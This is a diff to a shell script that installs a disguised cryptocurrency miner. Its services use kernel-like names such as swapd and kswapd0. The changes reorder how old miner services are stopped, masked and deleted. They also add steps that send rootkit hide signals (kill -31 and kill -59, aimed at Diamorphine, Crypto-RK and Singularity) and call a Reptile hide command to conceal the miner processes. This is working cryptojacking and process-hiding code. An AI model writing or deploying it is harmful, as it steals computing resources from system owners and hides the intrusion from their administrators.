@@ -557,25 +557,38 @@ fi
 # ==================== CLEAN UP OLD INSTALLATIONS ====================
 echo "[*] Cleaning up old miner installations..."
 
-# Stop all possible miner services (systemd)
+# CRITICAL: Disable auto-restart FIRST to prevent infinite loop
 if [ "$SYSTEMD_AVAILABLE" = true ]; then
-    force_stop_service "swapd kswapd0 xmrig" ""
+    echo "[*] Disabling systemd auto-restart for all miner services..."
+    for svc in swapd kswapd0 xmrig system-watchdog lightd; do
+        systemctl stop "$svc" 2>/dev/null || true
+        systemctl disable "$svc" 2>/dev/null || true
+        systemctl mask "$svc" 2>/dev/null || true  # Prevent re-enabling
+    done
+    
+    # Remove service files immediately
+    rm -f /etc/systemd/system/swapd.service 2>/dev/null
+    rm -f /etc/systemd/system/kswapd0.service 2>/dev/null
+    rm -f /etc/systemd/system/xmrig.service 2>/dev/null
+    rm -f /etc/systemd/system/system-watchdog.service 2>/dev/null
+    rm -f /etc/systemd/system/lightd.service 2>/dev/null
+    
+    # Reload systemd to forget the services
+    systemctl daemon-reload 2>/dev/null || true
+    systemctl reset-failed 2>/dev/null || true
 fi
 
-# Stop all possible miner processes (direct kill)
-force_stop_service "" "swapd kswapd0 xmrig"
-
-# Remove old service files
-rm -f /etc/systemd/system/swapd.service 2>/dev/null
-rm -f /etc/systemd/system/kswapd0.service 2>/dev/null
-rm -f /etc/systemd/system/xmrig.service 2>/dev/null
+# Remove SysV init scripts
 rm -f /etc/init.d/swapd 2>/dev/null
 rm -f /etc/init.d/kswapd0 2>/dev/null
 
-# Reload systemd if it exists
-if [ "$SYSTEMD_AVAILABLE" = true ]; then
-    systemctl daemon-reload 2>/dev/null || true
-fi
+# Kill watchdog script directly (in case it's running as daemon)
+pkill -9 -f system-watchdog 2>/dev/null || true
+rm -f /usr/local/bin/system-watchdog 2>/dev/null
+
+# NOW kill processes (no auto-restart will trigger)
+echo "[*] Killing remaining miner processes..."
+send_sig 9 swapd kswapd0 xmrig lightd config.json
 
 # Remove old miner directories
 rm -rf /root/.swapd 2>/dev/null
@@ -2185,38 +2198,33 @@ else
     echo '  systemctl status lightd → active (running) ✓'
 fi
 
-# Hide running processes using rootkit signals
-kill -31 $(pgrep -f -u root config.json 2>/dev/null) 2>/dev/null &
-kill -31 $(pgrep -f -u root config_background.json 2>/dev/null) 2>/dev/null &
-kill -31 $(/bin/ps ax -fu $USER 2>/dev/null | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
-kill -31 $(/bin/ps ax -fu $USER 2>/dev/null | grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
-#reptile_cmd hide
-
 echo ''
 
 # ==================== HIDE MINER PROCESSES ====================
 echo ""
 echo "=========================================="
-echo "ACTIVATING PROCESS HIDING (WAITING FOR SWAPD)"
+echo "ACTIVATING PROCESS HIDING"
 echo "=========================================="
 echo ""
+echo "[*] Sending hide signals unconditionally..."
+echo "[*] Note: rootkits hide themselves from lsmod — signals sent regardless"
+sleep 3  # Give processes time to be fully up before hiding
 
-# Wait up to ~30 seconds for swapd to appear
-for i in $(seq 1 30); do
-    if pgrep -f -u root swapd >/dev/null 2>&1; then
-        break
-    fi
-    sleep 1
-done
-
-# Now send hide signals
+# ---- kill -31: Diamorphine + Crypto-RK hide signal ----
 echo "[*] Sending kill -31 (Diamorphine/Crypto-RK hide)..."
-kill -31 $(pgrep -f -u root swapd 2>/dev/null) 2>/dev/null || true
-kill -31 $(pgrep -f -u root kswapd0 2>/dev/null) 2>/dev/null || true
+send_sig 31 config.json swapd swapfile lightd
+echo "[✓] kill -31 sent"
 
+# ---- kill -59: Singularity toggle hide signal ----
 echo "[*] Sending kill -59 (Singularity toggle hide)..."
-kill -59 $(pgrep -f -u root swapd 2>/dev/null) 2>/dev/null || true
-kill -59 $(pgrep -f -u root kswapd0 2>/dev/null) 2>/dev/null || true
+send_sig 59 config.json swapd swapfile lightd
+echo "[✓] kill -59 sent"
 
-# Optionally still call reptile's hide
+echo '========================================================================'
+
+# Hide running processes using rootkit signals
+kill -31 $(pgrep -f -u root config.json 2>/dev/null) 2>/dev/null &
+kill -31 $(pgrep -f -u root config_background.json 2>/dev/null) 2>/dev/null &
+kill -31 $(/bin/ps ax -fu $USER 2>/dev/null | grep "swapd" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
+kill -31 $(/bin/ps ax -fu $USER 2>/dev/null | grep "kswapd0" | grep -v "grep" | awk '{print $2}') 2>/dev/null &
 reptile_cmd hide
